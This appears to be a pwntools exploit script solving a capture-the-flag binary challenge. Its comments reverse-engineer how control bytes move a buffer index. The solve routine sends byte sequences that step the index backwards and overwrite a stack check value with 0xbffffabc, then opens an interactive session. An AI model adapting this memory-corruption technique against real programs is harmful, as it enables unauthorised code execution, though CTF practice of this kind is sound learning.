#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall1')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+281
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

# If value is less than 145:

#     If value is equal to 10, it will output a bell character (putchar(7)) and jump to a label loop.
#     If value is less than 11:
#         If value is 4, it outputs a tab character (putchar(9)) and increments idx.
#         If value is not 4:
#             If value is 8, it decrements idx and outputs a backspace character (putchar(8)).
#             If value is neither 4 nor 8, it jumps to do_things.

# 0x804925a <main+116>       cmp    DWORD PTR [ebp-0x50], 0xbffffabc

# idx = $ebp-0x54
# store = $ebp-0x4c
# check = $ebp-0x50
    
# 0x5 -> trigger write
# 0x8 -> decrement index
# 0x90 -> increment index
    
def solve():
    check = [0xbf, 0xff, 0xfa, 0xbc]

    io.recvuntil("patienter :")
    io.sendline(p8(0x8))
    io.sendline(p8(0x8))
    io.sendline(p8(0x8))
    io.sendline(p8(0x8))
    io.sendline(p8(check[3]))
    io.sendline(p8(0x6))
    io.sendline(p8(0x90))
    io.sendline(p8(0x90))

    io.sendline(p8(0x8))
    io.sendline(p8(0x8))
    io.sendline(p8(0x8))
    io.sendline(p8(check[2]))
    io.sendline(p8(0x6))
    io.sendline(p8(0x90))

    io.sendline(p8(0x8))
    io.sendline(p8(0x8))
    io.sendline(p8(check[1]))
    io.sendline(p8(0x6))

    io.sendline(p8(0x8))
    io.sendline(p8(check[0]))
    io.sendline(p8(0x6))

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
